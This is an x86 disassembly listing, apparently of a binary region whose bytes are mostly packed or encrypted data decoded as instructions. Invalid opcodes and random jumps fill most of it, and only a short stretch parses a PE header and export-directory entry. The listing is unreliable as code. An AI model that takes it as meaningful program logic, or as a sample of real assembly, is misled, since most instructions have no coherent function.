  40847a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40847b:	dec    ebx
  40847c:	fimul  DWORD PTR [edx+edi*1-0x19aae05]
  408483:	mov    ebx,0x5dc9d013
  408488:	add    al,0xab
  40848a:	mov    ds:0x409a4731,al
  40848f:	sar    DWORD PTR [edi-0x38],1
  408492:	pop    ss
  408493:	jno    0x4084eb
  408495:	xchg   esi,eax
  408496:	mov    cl,0x88
  408498:	inc    ebx
  408499:	(bad)  [eax-0x6710caa7]
  40849f:	fisubr DWORD PTR [edx+eiz*2]
  4084a2:	daa    
  4084a3:	cwde   
  4084a4:	popf   
  4084a5:	sbb    BYTE PTR [eax+0xf],al
  4084a8:	(bad)  
  4084a9:	lahf   
  4084aa:	add    al,0x1f
  4084ac:	add    DWORD PTR [ebx+0x3c],ebp
  4084af:	je     0x408487
  4084b1:	addr16 jp 0x4084aa
  4084b4:	lock sub ebx,DWORD PTR [ecx]
  4084b7:	pop    ecx
  4084b8:	mov    edi,0x29b1cf01
  4084bd:	fimul  WORD PTR ds:0x6a62c9e
  4084c3:	xchg   DWORD PTR [ebx+0x74],ecx
  4084c6:	out    0xd0,al
  4084c8:	popf   
  4084c9:	jp     0x40845a
  4084cb:	xchg   ecx,eax
  4084cc:	mov    eax,0x5a17f650
  4084d1:	shr    DWORD PTR [esi-0x66],1
  4084d4:	in     eax,dx
  4084d5:	cmp    bh,BYTE PTR [edx-0x39fdf0f3]
  4084db:	inc    ecx
  4084dc:	outs   dx,DWORD PTR ds:[esi]
  4084dd:	stos   BYTE PTR es:[edi],al
  4084de:	add    al,0xc
  4084e0:	lds    ebp,FWORD PTR [edx-0xeeca3c0]
  4084e6:	pop    ss
  4084e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084e8:	pop    es
  4084e9:	push   eax
  4084ea:	loopne 0x40855e
  4084ec:	add    BYTE PTR [ecx+0x2f],bh
  4084ef:	mov    bh,0xfe
  4084f1:	inc    BYTE PTR [ebp+0x34]
  4084f4:	add    DWORD PTR [ebp-0xd],edx
  4084f7:	dec    esi
  4084f8:	outs   dx,BYTE PTR ds:[esi]
  4084f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084fa:	mov    edi,0x198f0ae0
  4084ff:	shl    BYTE PTR [edi-0x23cf9958],1
  408505:	icebp  
  408506:	add    DWORD PTR ds:0x9b7f8d9f,eax
  40850c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40850d:	pop    ss
  40850e:	shl    edi,0x7a
  408511:	adc    ch,bh
  408513:	(bad)  
  408514:	ja     0x4084c7
  408516:	leave  
  408517:	ss addr16 jno 0x408525
  40851b:	add    ch,BYTE PTR [esi+edi*4+0x726ca28f]
  408522:	aam    0xad
  408524:	repnz mov edx,0x858a84f3
  40852b:	xor    eax,0x319def81
  408530:	shr    edi,cl
  408532:	mov    eax,edi
  408534:	or     eax,0xa4c02b16
  408539:	in     al,0xa
  40853b:	ret    
  40853c:	inc    ebx
  40853d:	fsubr  DWORD PTR [edi]
  40853f:	dec    eax
  408540:	das    
  408541:	rcl    DWORD PTR [edi+0x2f1d0392],1
  408547:	in     al,dx
  408548:	rcl    BYTE PTR [eax+0x1e0eb0a9],0x9e
  40854f:	arpl   WORD PTR [edi-0x1eb0f9fa],di
  408555:	add    DWORD PTR [ecx],ecx
  408557:	sbb    DWORD PTR [edx-0x3b7b2b52],esi
  40855d:	cdq    
  40855e:	stos   DWORD PTR es:[edi],eax
  40855f:	cmp    BYTE PTR [edx],dh
  408561:	je     0x408565
  408563:	dec    esi
  408564:	push   ebx
  408565:	adc    esp,DWORD PTR [ebx]
  408567:	ins    BYTE PTR es:[edi],dx
  408568:	retf   
  408569:	jle    0x408568
  40856b:	hlt    
  40856c:	call   0x7435:0xd1eff6ab
  408573:	jl     0x4085ed
  408575:	mov    dh,BYTE PTR [ecx-0x1ccde5c7]
  40857b:	cdq    
  40857c:	jae    0x40850a
  40857e:	popa   
  40857f:	xor    al,0x41
  408581:	mov    bl,0xf1
  408583:	(bad)  
  408585:	iret   
  408586:	outs   dx,DWORD PTR ds:[esi]
  408587:	aas    
  408588:	pop    ds
  408589:	jns    0x4085fb
  40858b:	xchg   DWORD PTR ds:0xe9aca567,esp
  408591:	scas   eax,DWORD PTR es:[edi]
  408592:	ins    BYTE PTR es:[edi],dx
  408593:	adc    bh,BYTE PTR [ebp+0x1a065f73]
  408599:	retf   0x5355
  40859c:	pop    ss
  40859d:	dec    ebx
  40859e:	pop    es
  40859f:	ja     0x4085cd
  4085a1:	int3   
  4085a2:	int    0x3b
  4085a4:	inc    edx
  4085a5:	mov    edx,0xa8edd175
  4085aa:	mov    dl,0x2c
  4085ac:	sub    cl,BYTE PTR [edi+eax*2]
  4085af:	pop    esi
  4085b0:	mov    ebx,0xcbab5735
  4085b5:	out    0x1c,al
  4085b7:	repnz mov ecx,DWORD PTR [edi+0x2d]
  4085bb:	mov    bh,0x2
  4085bd:	int    0xc8
  4085bf:	outs   dx,BYTE PTR ds:[esi]
  4085c0:	test   eax,0x99c91acc
  4085c5:	sub    bh,0x1b
  4085c8:	pop    ds
  4085c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085ca:	(bad)  
  4085cb:	mov    edi,0x94cea895
  4085d0:	sub    BYTE PTR [esi-0x4],bh
  4085d3:	data16 ss icebp 
  4085d6:	pop    ebp
  4085d7:	adc    edi,edi
  4085d9:	lods   eax,DWORD PTR gs:[esi]
  4085db:	pop    edx
  4085dc:	dec    edx
  4085dd:	lock (bad) 
  4085df:	xchg   ebx,eax
  4085e0:	pop    edi
  4085e1:	dec    esp
  4085e2:	imul   ebx,DWORD PTR [eax+0x612bdbc],0x4fd6f497
  4085ec:	gs xchg ebp,eax
  4085ee:	(bad)  
  4085ef:	iret   
  4085f0:	push   0x26
  4085f2:	mov    ebx,0xd65ce28f
  4085f7:	repz test DWORD PTR [ebp+0x32],ecx
  4085fb:	push   0xffffffd2
  4085fd:	cli    
  4085fe:	inc    esp
  4085ff:	scas   eax,DWORD PTR es:[edi]
  408600:	fidivr WORD PTR [eax-0x55]
  408603:	es mov esi,0xb6a956a6
  408609:	cld    
  40860a:	mov    eax,0x916628f5
  40860f:	stc    
  408610:	mov    edx,0xa99c104b
  408615:	jge    0x40859b
  408617:	in     eax,dx
  408618:	ret    
  408619:	sti    
  40861a:	sbb    edx,ecx
  40861c:	jne    0x4085c7
  40861e:	adc    DWORD PTR [ebx+0x3c487633],0x71420a9b
  408628:	les    edx,FWORD PTR [eax+ebp*4]
  40862b:	fwait
  40862c:	loope  0x4085cf
  40862e:	mov    dl,0x3a
  408630:	mov    ah,0x0
  408632:	pop    ebp
  408633:	pop    edi
  408634:	fwait
  408635:	cmp    bl,0x46
  408638:	inc    edx
  408639:	ja     0x408688
  40863b:	cdq    
  40863c:	loopne 0x4086bd
  40863e:	cmp    ah,BYTE PTR [ebp+0x5d16ed8f]
  408644:	retf   
  408645:	adc    esp,esp
  408647:	lahf   
  408648:	xrelease mov BYTE PTR es:[ecx],0x54
  40864d:	pop    edi
  40864e:	mov    ds:0xcf684d12,al
  408653:	or     al,0x95
  408655:	jne    0x408667
  40865b:	mov    eax,DWORD PTR [ebp-0x64]
  40865e:	cmp    DWORD PTR [ebp-0x5c],eax
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0xbeec4ad5
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    cl,dl
  40869e:	adc    al,0x5f
  4086a0:	clc    
  4086a1:	cmp    ebx,ebp
  4086a3:	dec    ebp
  4086a4:	pusha  
  4086a5:	ret    
  4086a6:	sub    esi,DWORD PTR [ecx-0x2f4a1bf1]
  4086ac:	pop    es
  4086ad:	inc    ebx
  4086ae:	push   cs
  4086af:	pop    esi
  4086b0:	(bad)  
  4086b1:	pop    ebp
  4086b2:	mov    ecx,0xc02ec5b7
  4086b7:	fst    QWORD PTR [ebp-0x16]
  4086ba:	jge    0x4086d5
  4086bc:	dec    bp
  4086be:	cli    
  4086bf:	cs jno 0x4086a9
  4086c2:	sahf   
  4086c3:	out    0x3d,eax
  4086c5:	add    bh,BYTE PTR [esp+edi*2+0x6d]
  4086c9:	test   eax,0x565c90f3
  4086ce:	mov    ?,WORD PTR [edi]
  4086d0:	(bad)  
  4086d1:	stos   DWORD PTR es:[edi],eax
  4086d2:	xor    al,0x9b
  4086d4:	cs adc eax,0x5bb1ce2a
  4086da:	push   ecx
  4086db:	shr    DWORD PTR [ecx+0x3236fe3c],cl
  4086e1:	aad    0x27
  4086e3:	mov    DWORD PTR [ecx+0x2fef370b],edx
  4086e9:	jecxz  0x4086df
  4086eb:	dec    esi
  4086ec:	mov    bl,0x99
  4086ee:	xor    dh,BYTE PTR [ebx+0x323f1e5]
  4086f4:	call   0xcd66:0xf04855ab
  4086fb:	dec    edx
  4086fc:	push   ebx
  4086fd:	cs and cl,0x29
  408701:	fdiv   DWORD PTR ds:0x5d475314
  408707:	sub    DWORD PTR ds:0xaae82a1b,eax
  40870d:	aas    
  40870e:	sar    DWORD PTR [esi-0x32],0x31
  408712:	xor    eax,0x3a3b8567
  408717:	arpl   di,dx
  408719:	aaa    
  40871a:	out    dx,eax
  40871b:	or     BYTE PTR [eax+edx*1+0x70],ch
  40871f:	ror    DWORD PTR ds:0x59b28278,cl
  408725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408726:	fistp  DWORD PTR [ebx+0x6a2baf48]
  40872c:	out    dx,eax
  40872d:	mov    al,ds:0xb63c4008
  408732:	push   ss
  408733:	adc    DWORD PTR [edx-0xe86b292],eax
  408739:	or     BYTE PTR ds:0xd50e5c34,al
  40873f:	fstp   QWORD PTR [esi]
  408741:	dec    edi
  408742:	(bad)  
  408743:	push   edx
  408744:	add    BYTE PTR [edi+eax*8+0x1],0xf0
  408749:	dec    esi
  40874a:	inc    ebx
  40874b:	mov    esi,0xa16ab47b
  408750:	add    bl,bh
  408752:	(bad)  
  408753:	mov    esp,0xad557c5d
  408758:	mov    bl,0x8a
  40875a:	xor    edx,edx
  40875c:	sub    eax,0xf74a5d9c
  408761:	mov    edi,0x97cb5556
  408766:	cmp    al,0xa7
  408768:	std    
  408769:	es mov ebp,0x3d5e32e8
  40876f:	addr16 out dx,al
  408771:	(bad)  
  408772:	popf   
  408773:	iret   
  408774:	adc    DWORD PTR [edi-0xa],edi
  408777:	dec    ecx
  408778:	push   0x42fea807
  40877d:	out    dx,eax
  40877e:	cmp    al,0x48
  408780:	sub    al,0xd5
  408782:	(bad)  
  408783:	mov    esi,DWORD PTR ds:0xdcc62197
  408789:	inc    edx
  40878a:	jo     0x408799
  40878c:	rol    edx,cl
  40878e:	out    dx,eax
  40878f:	sbb    BYTE PTR [edi-0x398c70d3],dh
  408795:	aam    0x32
  408797:	inc    eax
  408798:	push   ds
  408799:	stc    
  40879a:	scas   eax,DWORD PTR es:[edi]
  40879b:	lods   eax,DWORD PTR ds:[esi]
  40879c:	push   edi
  40879d:	aas    
  40879e:	add    dl,BYTE PTR [eax+0x1cb5ec6a]
  4087a4:	sbb    al,0xca
  4087a6:	mov    ah,0xc0
  4087a8:	and    eax,0x25aba691
  4087ad:	popf   
  4087ae:	and    ebx,DWORD PTR [ebx]
  4087b0:	in     eax,dx
  4087b1:	rep stos BYTE PTR es:[edi],al
  4087b3:	jmp    0x40878a
  4087b5:	retf   0x330f
  4087b8:	push   0xffffffb8
  4087ba:	js     0x408749
  4087bc:	add    DWORD PTR [ecx],esp
  4087be:	cs stc 
  4087c0:	add    ecx,edx
  4087c2:	leave  
  4087c3:	xchg   ebx,eax
  4087c4:	push   ss
  4087c5:	fstp   QWORD PTR [esi]
  4087c7:	out    0xad,al
  4087c9:	xchg   edx,eax
  4087ca:	jge    0x408769
  4087cc:	adc    dh,BYTE PTR [ebx]
  4087ce:	shl    DWORD PTR [eax],1
  4087d0:	or     eax,0xe6632957
  4087d5:	fsqrt  
  4087d7:	data16 clc 
  4087d9:	mov    edx,0x95618134
  4087de:	xor    eax,edx
  4087e0:	adc    esi,DWORD PTR [esi-0x12e8921c]
  4087e6:	aam    0xf5
  4087e8:	xchg   edi,eax
  4087e9:	call   0x4a3:0xff13cb77
  4087f0:	(bad)  
  4087f1:	adc    BYTE PTR [edi],cl
  4087f3:	std    
  4087f4:	stc    
  4087f5:	addr16 enter 0xc39b,0x31
  4087fa:	loope  0x408819
  4087fc:	stos   DWORD PTR es:[edi],eax
  4087fd:	xor    BYTE PTR [edi+0x6345f549],ah
  408803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408804:	xchg   esi,eax
  408805:	xchg   esi,eax
  408806:	xchg   edi,eax
  408807:	fs mov dl,0x3a
  40880a:	shl    BYTE PTR [ecx-0x77],cl
  40880d:	daa    
  40880e:	(bad)  [eax-0x55]
  408812:	pop    ebp
  408813:	cmp    al,0xb8
  408815:	mov    al,ds:0x8b480be2
  40881a:	xchg   ecx,eax
  40881b:	push   ds
  40881c:	out    0x98,al
  40881e:	(bad)  
  40881f:	dec    ebp
  408820:	popf   
  408821:	push   esp
  408822:	call   0xd7110381
  408827:	pop    esp
  408828:	loope  0x40887b
  40882a:	mov    BYTE PTR [edi+0x14cd7b58],cl
  408830:	mul    bl
  408832:	call   0xd7ce4772
  408837:	pop    ebx
  408838:	cmp    ch,BYTE PTR [ebx+0x1a]
  40883b:	or     ah,BYTE PTR [esi+0x20]
  40883e:	add    eax,0x23eb2f6e
  408843:	inc    ebx
  408844:	imul   esp,DWORD PTR [edi],0xffffffa4
  408847:	pop    esi
  408848:	adc    dh,BYTE PTR [ebp-0x741bfb87]
  40884e:	sub    BYTE PTR [bx+si-0x1e],al
  408852:	call   0x439fab44
  408857:	sub    eax,DWORD PTR [ecx]
  408859:	loope  0x408888
  40885b:	mov    esi,0x43076554
  408860:	or     eax,0x47a9640f
  408865:	lock outs dx,BYTE PTR ds:[esi]
  408867:	scas   al,BYTE PTR es:[edi]
  408868:	js     0x4087f7
  40886a:	stos   DWORD PTR es:[edi],eax
  40886b:	fistp  QWORD PTR es:[edi+0x7]
  40886f:	sbb    DWORD PTR [esi],edi
  408871:	jge    0x40886e
  408873:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408874:	imul   edi,DWORD PTR [edx+ebx*1+0x73b2ed3d],0xf890b77b
  40887f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408880:	sbb    dh,BYTE PTR [ebp-0x3f80c052]
  408886:	sbb    al,0xc4
  408888:	or     BYTE PTR [esi-0x37],dl
  40888b:	rol    BYTE PTR [edi+eiz*4-0x65],cl
  40888f:	or     dh,BYTE PTR [edi]
  408891:	mov    ebp,0x9048575
  408896:	cmp    al,0x63
  408898:	rcr    ch,0xdc
  40889b:	fwait
  40889c:	push   edx
  40889d:	or     cl,ch
  40889f:	dec    edi
  4088a0:	not    BYTE PTR [ecx]
  4088a2:	aas    
  4088a3:	test   BYTE PTR [edx+ecx*8-0x1ae083dc],bh
  4088aa:	in     al,dx
  4088ab:	imul   eax,DWORD PTR [edx+0x7dd85369],0x86961601
  4088b5:	es std 
  4088b7:	adc    DWORD PTR [eax],ebp
  4088b9:	outs   dx,DWORD PTR ds:[esi]
  4088ba:	ss sahf 
  4088bc:	and    eax,0x7ad435e9
  4088c1:	mov    cl,0x32
  4088c3:	push   0x49
  4088c5:	out    dx,eax
  4088c6:	in     al,dx
  4088c7:	scas   al,BYTE PTR es:[di]
  4088c9:	loopne 0x40889e
  4088cb:	mov    cl,BYTE PTR [eax]
  4088cd:	xchg   dx,ax
  4088cf:	jmp    0x4088cd
  4088d1:	push   esi
  4088d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088d3:	push   0xa15707dc
  4088d8:	ins    DWORD PTR es:[edi],dx
  4088d9:	and    cl,BYTE PTR [ebx-0x29]
  4088dc:	pop    ecx
  4088dd:	pop    es
  4088de:	xchg   DWORD PTR [eax-0x80],eax
  4088e1:	sub    BYTE PTR [ecx],0xb
  4088e4:	bound  esp,QWORD PTR [ebx-0x61e4ffb1]
  4088ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088eb:	adc    BYTE PTR [edi+ecx*8-0x77],0x58
  4088f0:	and    BYTE PTR [esi],dh
  4088f2:	stos   BYTE PTR es:[edi],al
  4088f3:	adc    DWORD PTR [ebp-0xf961b78],0x7089904c
  4088fd:	xchg   esp,eax
  4088fe:	rcl    BYTE PTR [ebx],cl
  408900:	xchg   DWORD PTR [esp+eax*4-0x4b1f93ff],edi
  408907:	repz pop DWORD PTR [esi+0x14]
  40890b:	mov    eax,0x98527a85
  408910:	xchg   edi,eax
  408911:	dec    edi
  408912:	mov    ds,WORD PTR [edx-0x5d]
  408915:	or     BYTE PTR [edx+eax*1],bh
  408918:	inc    eax
  408919:	adc    DWORD PTR [ebx-0x36],eax
  40891c:	add    eax,0x9070950d
  408921:	adc    DWORD PTR [ebx-0x6d],ebx
  408924:	popa   
  408925:	sbb    eax,0xb1517533
  40892a:	dec    esi
  40892b:	adc    BYTE PTR [ebx+ebx*4+0x21],cl
  40892f:	addr16 ret 
  408931:	jns    0x4088c1
  408933:	int    0x47
  408935:	push   0xffffffb9
  408937:	xchg   esp,eax
  408938:	ins    DWORD PTR es:[edi],dx
  408939:	push   es
  40893a:	int    0x9c
  40893c:	lds    ebp,FWORD PTR [edi]
  40893e:	ins    DWORD PTR es:[edi],dx
  40893f:	dec    ebx
  408940:	xchg   esi,eax
  408941:	xor    bh,BYTE PTR [ecx]
  408943:	out    0xc4,al
  408945:	mov    ebx,DWORD PTR [edi]
  408947:	lods   al,BYTE PTR ds:[esi]
  408948:	pusha  
  408949:	out    0x58,al
  40894b:	retf   
  40894c:	fs enter 0x9aa4,0x3
  408951:	cmp    DWORD PTR [ecx-0x73],0x23
  408955:	test   eax,0xbe0d4694
  40895a:	dec    eax
  40895b:	add    al,0xa7
  40895d:	outs   dx,BYTE PTR ds:[esi]
  40895e:	mov    ds:0x5e5dbf67,al
  408963:	int3   
  408964:	or     cl,ah
  408966:	mov    al,ds:0x2daa999f
  40896b:	fidiv  DWORD PTR [esi+0x576e2d94]
  408971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408972:	adc    edi,DWORD PTR [eax-0x5446525b]
  408978:	clc    
  408979:	adc    al,0x97
  40897b:	aas    
  40897c:	leave  
  40897d:	pop    ds
  40897e:	rol    eax,0x13
  408981:	sar    al,0x1e
  408984:	lods   eax,DWORD PTR ds:[esi]
  408985:	sbb    bl,BYTE PTR [ecx]
  408987:	mov    ecx,0xdabea2f3
  40898c:	cmp    ah,BYTE PTR [edi]
  40898e:	mov    ah,0xcb
  408990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408991:	mov    WORD PTR [edx],ds
  408993:	fwait
  408994:	inc    ebx
  408995:	jp     0x408995
  408997:	pop    esp
  408998:	out    dx,al
  408999:	mov    ch,0xc8
  40899b:	push   ebx
  40899c:	jmp    0x58c8:0x5d1d0d07
  4089a3:	xchg   DWORD PTR [ecx],ebx
  4089a5:	add    bl,BYTE PTR [edi+0x53c53c7f]
  4089ab:	jp     0x4089ae
  4089ad:	nop
  4089ae:	mov    eax,0x176a6e45
  4089b3:	lahf   
  4089b4:	push   cs
  4089b5:	data16 jno 0x408965
  4089b8:	int3   
  4089b9:	(bad)  
  4089ba:	pop    ss
  4089bb:	mov    es,WORD PTR [esi+0x73]
  4089be:	ins    BYTE PTR es:[edi],dx
  4089bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4089c0:	adc    DWORD PTR [esi-0x354a333a],0xffffffaf
  4089c7:	ja     0x4089b4
  4089c9:	sub    BYTE PTR [esi+0x415ae0c],dl
  4089cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089d0:	mov    ecx,0x5559aeb
  4089d5:	std    
  4089d6:	mov    dh,0xe3
  4089d8:	mov    ds:0xf0ae3c1e,eax
  4089dd:	addr16 aaa 
  4089df:	jl     0x408a21
  4089e1:	pop    edi
  4089e2:	or     bl,BYTE PTR [esi]
  4089e4:	call   0xacf06c50
  4089e9:	mov    esi,0x291476d1
  4089ee:	or     DWORD PTR ds:0xd63e53bd,edx
  4089f4:	mov    esp,0x28d26618
  4089f9:	sar    esi,0x6c
  4089fc:	aaa    
  4089fd:	mov    ds:0x278b692c,al
  408a02:	or     BYTE PTR [esi],0x72
  408a05:	or     DWORD PTR [eax],eax
  408a07:	xchg   ebp,eax
  408a08:	xor    cl,bh
  408a0a:	sub    eax,0x1b9bbf21
  408a0f:	outs   dx,BYTE PTR ds:[esi]
  408a10:	mov    ds:0x22d7d382,al
  408a15:	pop    ebp
  408a16:	sub    esp,eax
  408a18:	or     dl,BYTE PTR [ecx+0x3e]
  408a1b:	ss cmc 
  408a1d:	(bad)  
  408a1e:	aam    0xf8
  408a20:	int3   
  408a21:	push   ss
  408a22:	sbb    DWORD PTR [ecx+edx*2+0x5f14a4df],ebx
  408a29:	inc    ecx
  408a2a:	push   edx
  408a2b:	out    0x5e,eax
  408a2d:	into   
  408a2e:	cdq    
  408a2f:	(bad)  
  408a30:	cmp    edi,DWORD PTR [esi+0x2886fbf2]
  408a36:	or     esi,DWORD PTR [edx-0x61fac33f]
  408a3c:	pop    ds
  408a3d:	jecxz  0x408a7f
  408a3f:	inc    ecx
  408a40:	imul   esi,esi,0x25
  408a43:	xor    BYTE PTR [edx-0x34],0x9c
  408a47:	js     0x408aa9
  408a49:	add    ch,0xbd
  408a4c:	sub    BYTE PTR [ebx],bl
  408a4e:	sbb    ecx,0x9d9218ec
  408a54:	(bad)  
  408a55:	inc    edx
  408a56:	pusha  
  408a57:	sbb    al,0xf0
  408a59:	retf   
  408a5a:	add    bh,BYTE PTR [ebx+esi*1]
  408a5d:	sub    eax,0x568b068b
  408a62:	add    al,0xe9
  408a64:	fld    DWORD PTR [ebx]
  408a66:	add    BYTE PTR [eax],al
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	test   eax,edx
  408a76:	iret   
  408a77:	jo     0x408a2e
  408a79:	push   edi
  408a7a:	sbb    BYTE PTR [eax],bl
  408a7c:	sahf   
  408a7d:	adc    bl,BYTE PTR [eax]
  408a7f:	sbb    BYTE PTR [edi],cl
  408a81:	cli    
  408a82:	stc    
  408a83:	xor    BYTE PTR [edx-0x57],bh
  408a86:	lock out dx,al
  408a88:	mov    cl,0xa8
  408a8a:	jmp    0x14bd552f
  408a8f:	adc    ah,BYTE PTR [edi+0x4f]
  408a92:	sahf   
  408a93:	cld    
  408a94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a95:	push   ds
  408a96:	sub    eax,0x96b242d5
  408a9b:	adc    bl,al
  408a9d:	xchg   ebx,eax
  408a9e:	mov    bl,0x1a
  408aa0:	dec    BYTE PTR ds:0xb940ded8
  408aa6:	or     BYTE PTR [edx],ah
  408aa8:	push   es
  408aa9:	mov    dl,0x70
  408aab:	ss cli 
  408aad:	push   es
  408aae:	and    al,0x15
  408ab0:	jo     0x408a70
  408ab2:	out    0x1b,eax
  408ab4:	outs   dx,BYTE PTR ds:[esi]
  408ab5:	clc    
  408ab6:	shr    BYTE PTR [esp+ebx*8+0x7e],cl
  408aba:	lods   al,BYTE PTR ds:[esi]
  408abb:	stc    
  408abc:	cmp    al,0x7b
  408abe:	rol    BYTE PTR [edi+0x3f],cl
  408ac1:	mov    edi,0xd51b1526
  408ac6:	pop    es
  408ac7:	lock adc al,0x8
  408aca:	(bad)  
  408acc:	inc    ebp
  408acd:	jae    0x408ada
  408acf:	mov    dh,0xfe
  408ad1:	mov    edi,0x27b0e543
  408ad6:	dec    ecx
  408ad7:	hlt    
  408ad8:	add    edi,esp
  408ada:	inc    ebx
  408adb:	sahf   
  408adc:	or     ah,ch
  408ade:	and    al,0xf3
  408ae0:	mov    WORD PTR [edi+0x41],cs
  408ae3:	cmp    BYTE PTR ds:0x110bef75,dl
  408ae9:	in     al,0x97
  408aeb:	push   ebp
  408aec:	xor    al,0xa2
  408aee:	xchg   esi,eax
  408aef:	pop    edi
  408af0:	loope  0x408ac1
  408af2:	nop
  408af3:	dec    edx
  408af4:	ja     0x408aab
  408af6:	pop    DWORD PTR [edi+0x1d]
  408af9:	outs   dx,DWORD PTR ds:[esi]
  408afa:	retf   
  408afb:	or     DWORD PTR [esi+ebx*1-0x15],esi
  408aff:	clc    
  408b00:	lahf   
  408b01:	jne    0x408af3
  408b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b04:	jp     0x408b11
  408b06:	pop    ss
  408b07:	fsubp  st(2),st
  408b09:	xor    DWORD PTR [eax+0x2b],esi
  408b0c:	sbb    al,0x28
  408b0e:	jp     0x408aa1
  408b10:	loopne 0x408b7c
  408b12:	ret    0x3714
  408b15:	adc    BYTE PTR [ebp+0x1],ch
  408b18:	bswap  eax
  408b1a:	cwde   
  408b1b:	div    DWORD PTR [ebx-0x5]
  408b1e:	adc    BYTE PTR [esp+ebx*4-0xe],dl
  408b22:	repnz ffree st(0)
  408b25:	jo     0x408b12
  408b27:	sbb    edx,DWORD PTR [edi+0x59]
  408b2a:	sbb    al,0xa1
  408b2c:	and    edi,DWORD PTR [ebp+edi*2+0x6c]
  408b30:	jp     0x408aee
  408b32:	stos   DWORD PTR es:[edi],eax
  408b33:	(bad)  
  408b35:	adc    BYTE PTR [ecx-0x1c566fa0],bh
  408b3b:	push   es
  408b3c:	in     eax,dx
  408b3d:	add    al,0x80
  408b3f:	push   0x54b627f8
  408b44:	std    
  408b45:	sub    eax,0xbcd2d746
  408b4a:	adc    eax,0x2f7a7782
  408b4f:	fld    DWORD PTR [ebp+0x46]
  408b52:	push   cs
  408b53:	addr16 mov eax,ds:0x1b41
  408b57:	stos   BYTE PTR es:[edi],al
  408b58:	mov    WORD PTR [edx],cs
  408b5a:	push   ds
  408b5b:	(bad)  
  408b5c:	cmp    cl,dh
  408b5e:	pushf  
  408b5f:	fstp   DWORD PTR [eax+eax*8-0x390f1c39]
  408b66:	and    BYTE PTR [edx-0x33],cl
  408b69:	lahf   
  408b6a:	jle    0x408b27
  408b6c:	push   ebx
  408b6d:	test   ecx,0x2cfd08ad
  408b73:	push   es
  408b74:	sub    ah,BYTE PTR [edi]
  408b76:	inc    eax
  408b77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b78:	inc    ebx
  408b79:	mov    eax,ds:0x4fae0e33
  408b7e:	push   ecx
  408b7f:	rcr    BYTE PTR [eax+0x26],0xa5
  408b83:	call   0xc28c7138
  408b88:	bound  eax,QWORD PTR [ecx+esi*2+0x49b00e65]
  408b8f:	ss test ebx,0xb22c425f
  408b96:	inc    edx
  408b97:	in     al,dx
  408b98:	idiv   BYTE PTR [esi-0x5c]
  408b9b:	sbb    eax,0xae9e1bda
  408ba0:	test   al,0xcd
  408ba2:	jmp    0xca478f0e
  408ba7:	lds    edx,FWORD PTR [esi+ebp*2-0x43]
  408bab:	popf   
  408bac:	jae    0x408b96
  408bae:	(bad)  
  408baf:	mov    eax,0xffbc5904
  408bb4:	dec    ebp
  408bb5:	rcr    ebp,0xab
  408bb8:	pop    esp
  408bb9:	es ret 0x6a87
  408bbd:	xor    al,0x9c
  408bbf:	jmp    0xb28e:0xd82c27d6
  408bc6:	jmp    0x905:0xd376a530
  408bcd:	adc    esp,DWORD PTR [edi-0x6b0f4a3b]
  408bd3:	es daa 
  408bd5:	or     BYTE PTR [ecx+0x387ad373],bh
  408bdb:	ss clc 
  408bdd:	cmp    al,0x1e
  408bdf:	mov    WORD PTR [ebp+0x40],fs
  408be2:	mov    ds:0x7d15802b,al
  408be7:	lds    edx,FWORD PTR [edx+0x6d07a235]
  408bed:	jno    0x408bbe
  408bef:	pop    esi
  408bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bf1:	icebp  
  408bf2:	repz fwait
  408bf4:	scas   eax,DWORD PTR es:[edi]
  408bf5:	or     al,0x7e
  408bf7:	inc    esp
  408bf9:	push   es
  408bfa:	stos   DWORD PTR es:[edi],eax
  408bfb:	mov    ecx,DWORD PTR [edi-0x66]
  408bfe:	outs   dx,BYTE PTR ds:[esi]
  408bff:	test   al,0x7d
  408c01:	int3   
  408c02:	rol    DWORD PTR [ebx+0x158b5055],0xe3
  408c09:	out    dx,al
  408c0a:	and    al,BYTE PTR [ebx-0x32]
  408c0d:	popf   
  408c0e:	mov    ebp,0x533bbdad
  408c13:	inc    esi
  408c14:	fdiv   QWORD PTR [edi-0x63]
  408c17:	jmp    0x12f78f22
  408c1c:	rcr    BYTE PTR [eax-0x11dc923],0xeb
  408c23:	es inc esi
  408c25:	jp     0x408c71
  408c27:	cmp    ebx,edx
